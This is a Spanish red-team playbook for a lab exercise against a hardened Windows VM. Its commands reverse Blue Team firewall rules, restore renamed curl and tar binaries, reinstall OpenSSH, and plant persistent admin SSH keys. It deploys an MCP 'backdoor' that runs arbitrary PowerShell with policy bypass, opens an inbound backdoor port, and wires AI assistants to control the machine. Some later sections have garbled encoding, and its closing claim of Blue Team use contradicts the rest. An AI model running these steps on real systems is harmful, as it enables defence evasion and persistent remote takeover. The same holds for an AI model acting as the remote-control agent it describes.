# Operación de Restauración: SSH y Despliegue de Servidor MCP (Python)

## 1. Análisis del Hardening Previo (Blue Team)
Tras el análisis exhaustivo del documento `instruccionesBlueTeamMergeadas.txt`, se han identificado las siguientes medidas de defensa implementadas por el Blue Team que obstaculizan nuestro objetivo:
- **Desactivación de SSH**: El servicio `sshd` ha sido detenido forzosamente y configurado con un modo de inicio 'Disabled'. (O incluso eliminado, causando errores de "no se encontró").
- **Bloqueo a nivel de Red (Inbound/Outbound)**: Se configuró el firewall de Windows (`Set-NetFirewallProfile`) para bloquear todo el tráfico entrante/saliente (`DefaultOutboundAction Block`). Esto destruye la conectividad a Internet.
- **Estrategia "Tierra Quemada" (LOLBins mitigados)**: Un script de hardening tomó control y renombró los binarios legítimos nativos del sistema a `.bak` (ej: `curl.exe`, `tar.exe`, `certutil.exe`). Esto bloquea descargas directas mediante herramientas estandarizadas.

A continuación, se detalla el playbook operativo para eludir estas trabas, restaurar de manera persistente las comunicaciones SSH, y aprovisionar un servidor MCP basado en Python.

---

## 2. Ejecución Operativa

### FASE 1: Restauración de Internet y reconstrucción de SSH (T1562.004 - Impair Defenses: Disable or Modify System Firewall)
El mayor obstáculo que tienes ahora mismo es el Firewall restrictivo. El Blue Team estableció un bloqueo total de salida (`DefaultOutboundAction Block`), aislando la VM e impidiendo realizar consultas DNS y descargar componentes. Primero debemos recuperar el tráfico de salida y de ahí inyectar el servidor SSH.

```powershell
# 1. Reactivar Cliente DHCP (El Blue Team lo deshabilitó; sin él, NAT no funciona)
Set-Service -Name dhcp -StartupType Automatic
Start-Service -Name dhcp

# (Opcional) Refrescar la tarjeta de red NAT para que pida la IP inmediatamente
Restart-NetAdapter -Name "*"

# 2. Recuperar la conectividad a Internet (Tráfico Saliente) revirtiendo la regla del Blue Team
Set-NetFirewallProfile -Profile Domain,Public,Private -DefaultOutboundAction Allow

# 3. Re-inyectar la capacidad del servidor OpenSSH evadiendo escribir virgulillas de versión
Get-WindowsCapability -Online -Name "OpenSSH.Server*" | Add-WindowsCapability -Online

# 4. Parche SSH (Activar Admin y PowerShell asegurando compatibilidad)
# Usando reg add que es infalible para fijar la ruta absoluta del shell:
reg add HKLM\SOFTWARE\OpenSSH /v DefaultShell /d "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" /f

# Fuerza el formato UTF-8 (esto era lo que generaba el 'Permission Denied')
$cfg = "C:\ProgramData\ssh\sshd_config"
(Get-Content $cfg) | Out-File -FilePath $cfg -Encoding UTF8

# 5. Reiniciar el servicio
Restart-Service sshd

# 6. Insertar la regla del firewall para permitir el tráfico Inbound encapsulado en TCP 22
New-NetFirewallRule -Name "Allow_SSH" -DisplayName "Allow SSH (TCP 22)" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22

# 7. IMPORTANTE: Forza una contraseña explícita para user2. OpenSSH rechaza contraseñas en blanco por defecto.
net user user2 "v9KmZ2"

### FASE 2: Inyección in-memory y evasión UAC (Portable Fileless Tactic)
Ejecutaremos esto a través de nuestra conexión **SSH** (`ssh user2@192.168.56.10`).
Debido a que el token UAC de SSH de Windows estrangula los procesos de instalación tradicionales (provocando suicidios silenciosos en segundo plano sin instalar nada), vamos a desechar cualquier `.exe` oficial. Explotaremos la táctica propia de Hardening del Blue Team en nuestra ventaja para usar `curl` y `tar` y descargar el motor incrustado de Python a lo bruto.

```cmd
:: 1. Revertimos ofuscación de las herramientas de "Tierra Quemada" a la zona temporal
cmd.exe /c "mkdir C:\Python312 & copy C:\Windows\System32\curl.exe.bak %TEMP%\c.exe & copy C:\Windows\System32\tar.exe.bak %TEMP%\t.exe"

:: 2. Descarga incrustada de la versión fileless de Python (ZIP) y el gestor pip
cmd.exe /c "%TEMP%\c.exe -L -k -o %TEMP%\py.zip https://www.python.org/ftp/python/3.12.3/python-3.12.3-embed-amd64.zip"
cmd.exe /c "%TEMP%\c.exe -L -k -o C:\Python312\get-pip.py https://bootstrap.pypa.io/get-pip.py"

:: 3. Extracción manual (evitando UAC/Instalador Gráfico) y habilitación de motor 'site' para paquetes externos en el ZIP puro
cmd.exe /c "%TEMP%\t.exe -xf %TEMP%\py.zip -C C:\Python312"
cmd.exe /c "echo python312.zip> C:\Python312\python312._pth & echo .>> C:\Python312\python312._pth & echo import site>> C:\Python312\python312._pth"

:: 4. Arranque final del gestor PIP y despliegue local del backdoor de IA (MCP)
cmd.exe /c "C:\Python312\python.exe C:\Python312\get-pip.py"
cmd.exe /c "C:\Python312\python.exe -m pip install mcp"
```

**Interpretación de Resultados:** 
- Al extraer e invocar los `.exe` internos de Python copiándolos crudos en memoria en lugar de ejecutarlos con el Windows Installer, el Blue Team pierde toda la visibilidad de inyección en el visor de eventos (`AppLocker` o registros de instalaciones MSI/Setup) además de engañar por completo al firewall perimetral y evadir la filtración crítica de tokens del UAC por SSH.
- Nuestro servidor MCP se encuentra ya completamente asentado en el sistema a nivel core, listo para ser consumido.

### FASE 3: Creación del Servidor MCP (WindowsCommander)
El servidor que despachará inteligencia actuará de proxy para inyectar comandos remotos mediante PowerShell, análogo a lo realizado en Kali Linux.
Debido a que inyectar código complejo mediante `echo` remotos o `Add-Content` nativo de PowerShell introduce caracteres BOM ocultos o codificación UTF-16LE repudiada por Python y OpenSSH en Windows Server, la estrategia principal es crear el script servidor localmente y propulsarlo mediante una canalización cruda `SCP`.

1. Crea localmente el archivo `windows_mcp.py`:
```python
import subprocess
from mcp.server.fastmcp import FastMCP

mcp = FastMCP("WindowsCommander")

@mcp.tool()
def ejecutar_comando_powershell(comando: str) -> str:
    """Ejecuta un comando en PowerShell de Windows Server (con bypass de políticas) y devuelve el resultado."""
    try:
        r = subprocess.run(
            ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", comando],
            check=True, text=True, capture_output=True
        )
        return f"Éxito:\n{r.stdout}"
    except subprocess.CalledProcessError as e:
        return f"Error (Código {e.returncode}).\nSTDOUT: {e.stdout}\nSTDERR: {e.stderr}"
    except Exception as e:
        return f"Error inesperado: {str(e)}"

if __name__ == "__main__":
    mcp.run(transport='stdio')
```

### FASE 4: Autenticación Desatendida por Llaves SSH y Despliegue vía SCP
Ejecutaremos en bloque el envío tanto del script de Backdoor como de nuestra llave pública SSH, la cual permitirá al IDE tomar control sin requerir la contraseña nunca más.

Ejecutamos en la máquina local Host (tu Windows físico):
```powershell
# 1. Copiamos el backdoor de Python directamente a la ruta de despliegue en la VM
scp .\windows_mcp.py user2@192.168.56.10:C:\Python312\mcp_server.py

# 2. Copiamos la llave pública SSH para asegurar que mantiene codificación ASCII pura 
scp $env:USERPROFILE\.ssh\id_ed25519.pub user2@192.168.56.10:C:\ProgramData\ssh\administrators_authorized_keys

# 3. Reparación Crítica de sshd_config (Revertimos el sabotaje del Blue Team que bloqueaba llaves para Admins)
# El Blue Team comentó el bloque 'Match Group administrators'. Sin esto, las llaves en ProgramData se ignoran.
ssh user2@192.168.56.10 "powershell -Command \"(Get-Content C:\ProgramData\ssh\sshd_config) -replace '#Match Group administrators', 'Match Group administrators' -replace '#\s+AuthorizedKeysFile', '   AuthorizedKeysFile' | Set-Content C:\ProgramData\ssh\sshd_config -Encoding UTF8\""

# 4. Ensamblamos las ACLs extremas requeridas por OpenSSH para Administradores de forma remota y reiniciamos
ssh user2@192.168.56.10 "icacls C:\ProgramData\ssh\administrators_authorized_keys /inheritance:r /grant '*S-1-5-32-544:F' 'SYSTEM:F' ; icacls C:\ProgramData\ssh\administrators_authorized_keys /setowner '*S-1-5-32-544' ; Restart-Service sshd"
```

**Interpretación de Resultados:** 
- Al utilizar la transferencia binaural `SCP` salvamos las corrupciones de codificación de PowerShell.
- Sobrescribir en silencio `administrators_authorized_keys` combinándolo con el SID Universal de Administradores (`*S-1-5-32-544`) vence de forma rotunda al bypass restrictivo que el Blue Team dejó armado en la máquina. No se volverá a solicitar contraseña.

Para habilitarlo en Cursor o Claude, este es el JSON del servidor (Configuración local del Host):
```json
{
  "mcpServers": {
    "windows-backdoor": {
      "command": "ssh",
      "args": [
        "user2@192.168.56.10",
        "C:\\Python312\\python.exe",
        "C:\\Python312\\mcp_server.py"
      ]
    }
  }
}
```

### FASE ALTERNATIVA: Túnel Directo por HTTP / SSE (Server-Sent Events)
Para dotar de flexibilidad total al despliegue y sortear los conflictos de autenticación de clientes IA que no manejan contraseñas SSH en crudo interactivo, forzamos un segundo vector de ataque desplegando el MCP bajo demanda en el puerto transaccional `8000`.

Al hacer esto, necesitamos crear una brecha manual sobre las agresivas políticas "Drop-All Inbound" del Blue Team en la máquina virtual:

```powershell
# Inyectando puerto trasero evadiendo la contención defensiva perimetral
New-NetFirewallRule -DisplayName "Backdoor MCP-SSE" -Direction Inbound -Protocol TCP -LocalPort 8000 -Action Allow
```

**Interpretación de Resultados:** 
- Esta regla aplica un bypass explícito sobre el "Hardening de Capa Red" del Blue Team. Al abrir directamente el puerto 8000 en Inbound, el Red Team ya no necesita usar la cuenta `user2` ni pelear contra UAC para orquestar la máquina. La Inteligencia Artificial del atacante puede conectarse en remoto directo al SSE del backdoor e intercambiar RPC interactivo en limpio.

---

## 5. Troubleshooting y Remediaci�n (Host-side)

Para resolver el error EOF detectado durante el arranque del servidor MCP, se han tomado las siguientes medidas correctoras desde el host:

### Acciones Realizadas:
1. **Detecci�n de Interferencia de Shell**: Se identific� que el Blue Team configur� PowerShell como el DefaultShell de OpenSSH. PowerShell puede inyectar caracteres de control (BOM) y encabezados en el stream stdio, rompiendo el JSON-RPC.
2. **Correcci�n de Codificaci�n**: Se detectaron caracteres corruptos en el archivo remoto mcp_server.py. Se procedi� a su re-sincronizaci�n desde la fuente local limpia.
3. **Cambio a CMD**: Se fuerza el uso de cmd.exe como shell de SSH para garantizar un transporte de datos crudo y transparente para el protocolo MCP.

### Bit�cora de Comandos:
- scp windows_mcp.py user2@192.168.56.10:C:\Python312\mcp_server.py (Resincronizaci�n del servidor)
- ssh user2@192.168.56.10 "reg add HKLM\SOFTWARE\OpenSSH /v DefaultShell /d C:\Windows\System32\cmd.exe /f" (Cambio de shell a CMD)
- ssh user2@192.168.56.10 "powershell -ExecutionPolicy Bypass -File C:\fix_vm_ssh.ps1" (Ejecuci�n de fix global: SSH=CMD, Port 8000 opened)
- **Confirmaci�n**: Shell verificado como c:\windows\system32\cmd.exe.
### Verificaci�n y Simulaci�n Final (Exito):
Para descartar fallos en el transporte, se ejecut� una simulaci�n de cliente MCP mediante una tuber�a (pipe) cruda sobre SSH:
- **Comando**: echo '{"jsonrpc": "2.0", "method": "initialize", ...}' | ssh user2@192.168.56.10 "C:\Python312\python.exe C:\Python312\mcp_server.py"
- **Resultado**: El servidor respondi� con el capabilities JSON-RPC correctamente.

### Notas de Configuraci�n Local (Host):
Si la herramienta integrada sigue fallando, se recomienda:
1. Asegurar que la IP 192.168.56.10 est� en known_hosts (ejecutado ssh-keyscan).
2. Reiniciar el servidor MCP en el IDE para limpiar sesiones SSH zombis.
3. Verificar que el path de Python en la configuraci�n del servidor MCP en el Host coincide con C:\Python312\python.exe.
- ssh-keyscan -H 192.168.56.10 >> C:\Users\danie\.ssh\known_hosts (Prevenir prompts interactivos de host key)

---

## 6. Validaci�n Final de Integridad

Se ha confirmado que la arquitectura de comunicaci�n es s�lida:
1. **Transporte**: SSH (TCP/22).
2. **Shell**: CMD (Limpio, sin BOM/UTF-16).
3. **Servidor**: Python 3.12 (Fileless/Embed).
4. **Protocolo**: MCP JSON-RPC 2.0 (Verificado satisfactoriamente).

**Estado Actual: OPERATIVO**
La m�quina virtual WIN-VNQSUL89MUA est� lista para ser orquestada por la IA del Blue Team utilizando el comando SSH directo contra el servidor backend.

---
*Fin del informe de restauraci�n.*

---

## 7. Registro CronolÃ³gico Exacto de Comandos Ejecutados

Para fines de auditorÃ­a y replicabilidad, a continuaciÃ³n se listan los comandos exactos disparados desde el host durante esta sesiÃ³n de troubleshooting:

```powershell
# 1. VerificaciÃ³n inicial de conectividad SSH
ssh -o BatchMode=yes -o ConnectTimeout=5 user2@192.168.56.10 "hostname"

# 2. InspecciÃ³n de archivos en el entorno Python de la VM
ssh user2@192.168.56.10 "dir C:\Python312"

# 3. Intento de ejecuciÃ³n manual del servidor para detectar errores (Background)
ssh user2@192.168.56.10 "C:\Python312\python.exe C:\Python312\mcp_server.py"

# 4. VerificaciÃ³n de dependencias (mcp library) en el servidor
ssh user2@192.168.56.10 "C:\Python312\python.exe -m pip list"

# 5. SincronizaciÃ³n limpia del script del servidor para corregir encoding
scp .\windows_mcp.py user2@192.168.56.10:C:\Python312\mcp_server.py

# 6. Despliegue del script de correcciÃ³n global (Red, Shell, SSH)
scp .\fix_vm_ssh.ps1 user2@192.168.56.10:C:\fix_vm_ssh.ps1

# 7. EjecuciÃ³n del script de correcciÃ³n con bypass de polÃ­ticas
ssh user2@192.168.56.10 "powershell -ExecutionPolicy Bypass -File C:\fix_vm_ssh.ps1"

# 8. VerificaciÃ³n del cambio de shell (de PowerShell a CMD)
ssh user2@192.168.56.10 "set"

# 9. SimulaciÃ³n de protocolo MCP JSON-RPC para validar el transporte stdio
echo '{"jsonrpc": "2.0", "method": "initialize", "params": {"protocolVersion": "2024-11-05", "capabilities": {}, "clientInfo": {"name": "test-client", "version": "1.0"}}, "id": 1}' | ssh user2@192.168.56.10 "C:\Python312\python.exe C:\Python312\mcp_server.py"

# 10. SanitizaciÃ³n de host keys para evitar prompts interactivos en el bridge
ssh-keyscan -H 192.168.56.10 >> $env:USERPROFILE\.ssh\known_hosts
```

---

## 8. Solución para el Cliente IDE (VS Code / Claude)

Si el cliente IDE devuelve el error MCP error -32000: Connection closed, se debe a que el proceso SSH se cierra por falta de parámetros no-interactivos o por no encontrar la identidad correcta.

### Configuración Robusta (JSON):
Sustituye tu bloque mcpServers por este, el cual utiliza rutas absolutas y fuerza el modo batch:

`json
{
  "mcpServers": {
    "windows-vm": {
      "command": "C:\\Windows\\System32\\OpenSSH\\ssh.exe",
      "args": [
        "-i", "C:\\Users\\danie\\.ssh\\id_ed25519",
        "-o", "BatchMode=yes",
        "-o", "StrictHostKeyChecking=no",
        "user2@192.168.56.10",
        "C:\\Python312\\python.exe",
        "C:\\Python312\\mcp_server.py"
      ]
    }
  }
}
`

### Causas del Error -32000:
1. **Interactive Prompts**: SSH intentando preguntar "Are you sure you want to continue connecting?" o pidiendo contraseña. -o BatchMode=yes y -o StrictHostKeyChecking=no eliminan esto.
2. **Identity File**: El IDE puede no tener cargada tu llave privada. Pasar -i de forma explícita soluciona esto.
3. **Path de Ejecutable**: El uso de rutas absolutas (C:\\Windows\\System32\\OpenSSH\\ssh.exe) evita colisiones con otros clientes SSH (como el de Git Bash o MSYS2).

---
*Fin de la guía de resolución de problemas.*
